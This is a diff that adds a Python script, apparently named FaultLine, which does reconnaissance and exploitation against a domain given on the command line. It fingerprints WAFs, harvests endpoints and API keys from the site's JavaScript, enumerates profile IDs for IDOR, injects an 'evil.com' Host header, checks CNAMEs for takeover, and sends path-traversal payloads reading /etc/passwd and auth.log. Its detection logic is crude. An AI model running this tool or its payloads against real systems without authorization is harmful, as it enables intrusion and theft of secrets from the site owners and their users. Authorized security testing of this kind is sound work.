@@ -1,0 +1,162 @@
+#!/usr/bin/env python3
+import requests
+import re
+import sys
+import argparse
+import os
+import json
+import dns.resolver
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+
+# Colors for terminal output
+R = "\033[91m"  # Red
+G = "\033[92m"  # Green
+C = "\033[96m"  # Cyan
+Y = "\033[93m"  # Yellow
+NC = "\033[0m"  # No Color
+
+# Output directories
+EXPORT_DIR = "faultline_exports"
+os.makedirs(EXPORT_DIR, exist_ok=True)
+
+# Data storage
+results = {"target": "", "waf": "", "endpoints": [], "idor": [], "host_injection": [], "cname": [], "lfi": []}
+
+# ===[ Banner ]===
+def banner():
+    print(f"""{C}
+███████╗ █████╗ ██╗   ██╗██╗  ██╗████████╗██╗     ██╗███╗   ██╗███████╗
+██╔════╝██╔══██╗██║   ██║██║ ██╔╝╚══██╔══╝██║     ██║████╗  ██║██╔════╝
+█████╗  ███████║██║   ██║█████╔╝    ██║   ██║     ██║██╔██╗ ██║█████╗  
+██╔══╝  ██╔══██║██║   ██║██╔═██╗    ██║   ██║     ██║██║╚██╗██║██╔══╝  
+██║     ██║  ██║╚██████╔╝██║  ██╗   ██║   ███████╗██║██║ ╚████║███████╗
+╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝
+    {NC}""")
+
+# ===[ Command-line Arguments ]===
+def parse_args():
+    parser = argparse.ArgumentParser(description="FaultLine: Python Recon & Exploitation Module")
+    parser.add_argument("-t", "--target", required=True, help="Target domain (e.g., example.com)")
+    parser.add_argument("-m", "--mode", required=True, choices=["recon", "exploit", "all"], help="Mode: recon, exploit, or all")
+    return parser.parse_args()
+
+# ===[ 1. WAF Detection ]===
+def detect_waf(target):
+    print(f"{C}[+] Checking for WAF...{NC}")
+    waf_signatures = ["cloudflare", "sucuri", "incapsula", "mod_security"]
+    headers = requests.get(f"https://{target}", timeout=5).headers
+    for key, value in headers.items():
+        if any(waf in value.lower() for waf in waf_signatures):
+            print(f"{Y}[!] WAF Detected: {value}{NC}")
+            results["waf"] = value
+            return
+    print(f"{G}[+] No WAF Detected{NC}")
+    results["waf"] = "None"
+
+# ===[ 2. Extract Endpoints & API Keys from JavaScript ]===
+def scrape_js(target):
+    print(f"{C}[+] Extracting endpoints and API keys from JS files...{NC}")
+    response = requests.get(f"https://{target}")
+    soup = BeautifulSoup(response.text, "html.parser")
+    scripts = [urljoin(f"https://{target}", script["src"]) for script in soup.find_all("script") if script.get("src")]
+
+    for script_url in scripts:
+        try:
+            script_content = requests.get(script_url).text
+            endpoints = re.findall(r"(https?:\/\/[a-zA-Z0-9./?=_-]*)", script_content)
+            api_keys = re.findall(r"(?i)(api_key|apikey|auth_token)[\"']?\s*:\s*[\"']([a-zA-Z0-9_-]+)", script_content)
+
+            if endpoints:
+                results["endpoints"].extend(endpoints)
+                print(f"{Y}[+] Found endpoints in {script_url}:{NC}")
+                for endpoint in endpoints:
+                    print(f"    {endpoint}")
+
+            if api_keys:
+                print(f"{R}[!] Found possible API keys in {script_url}:{NC}")
+                for key in api_keys:
+                    print(f"    {key[1]}")
+        except:
+            continue
+
+# ===[ 3. IDOR Testing ]===
+def test_idor(target):
+    print(f"{C}[+] Testing for IDOR vulnerabilities...{NC}")
+    for i in range(1, 5):
+        url = f"https://{target}/profile?id={i}"
+        response = requests.get(url)
+        if "admin" in response.text.lower():
+            print(f"{R}[!] Potential IDOR found at {url}{NC}")
+            results["idor"].append(url)
+
+# ===[ 4. Host Header Injection ]===
+def test_host_header(target):
+    print(f"{C}[+] Testing for Host Header Injection...{NC}")
+    fake_host = "evil.com"
+    response = requests.get(f"https://{target}", headers={"Host": fake_host})
+    if fake_host in response.text:
+        print(f"{R}[!] Vulnerable to Host Header Injection: {target}{NC}")
+        results["host_injection"].append(target)
+
+# ===[ 5. CNAME Hijacking ]===
+def check_cname_takeover(target):
+    try:
+        print(f"{C}[+] Checking for possible CNAME takeover...{NC}")
+        answers = dns.resolver.resolve(target, "CNAME")
+        for rdata in answers:
+            cname = str(rdata.target)
+            if "herokudns.com" in cname or "amazonaws.com" in cname:
+                print(f"{R}[!] Possible CNAME takeover risk found: {cname}{NC}")
+                results["cname"].append(cname)
+    except:
+        print(f"{G}[-] No vulnerable CNAME records found.{NC}")
+
+# ===[ 6. LFI Testing ]===
+def test_lfi(target):
+    print(f"{C}[+] Testing for Local File Inclusion (LFI)...{NC}")
+    payloads = ["../../etc/passwd", "../win.ini", "../../../var/log/auth.log"]
+    for payload in payloads:
+        url = f"https://{target}/page?file={payload}"
+        response = requests.get(url)
+        if "root:x" in response.text or "ntdll.dll" in response.text:
+            print(f"{R}[!] LFI Vulnerability Found: {url}{NC}")
+            results["lfi"].append(url)
+
+# ===[ Export Results ]===
+def export_results(target):
+    json_file = os.path.join(EXPORT_DIR, f"{target}_results.json")
+    md_file = os.path.join(EXPORT_DIR, f"{target}_report.md")
+
+    with open(json_file, "w") as f:
+        json.dump(results, f, indent=4)
+
+    with open(md_file, "w") as f:
+        f.write(f"# FaultLine Scan Report - {target}\n\n")
+        f.write(f"**WAF Detected:** {results['waf']}\n\n")
+        f.write("## Extracted Endpoints\n" + "\n".join(results["endpoints"]) + "\n\n")
+        f.write("## Potential IDOR Vulnerabilities\n" + "\n".join(results["idor"]) + "\n\n")
+        f.write("## Possible CNAME Takeover Targets\n" + "\n".join(results["cname"]) + "\n\n")
+
+    print(f"{G}[+] Results exported to {json_file} and {md_file}{NC}")
+
+# ===[ Main Function ]===
+def main():
+    args = parse_args()
+    banner()
+    results["target"] = args.target
+
+    if args.mode in ["recon", "all"]:
+        detect_waf(args.target)
+        scrape_js(args.target)
+        check_cname_takeover(args.target)
+
+    if args.mode in ["exploit", "all"]:
+        test_idor(args.target)
+        test_host_header(args.target)
+        test_lfi(args.target)
+
+    export_results(args.target)
+
+if __name__ == "__main__":
+    main()
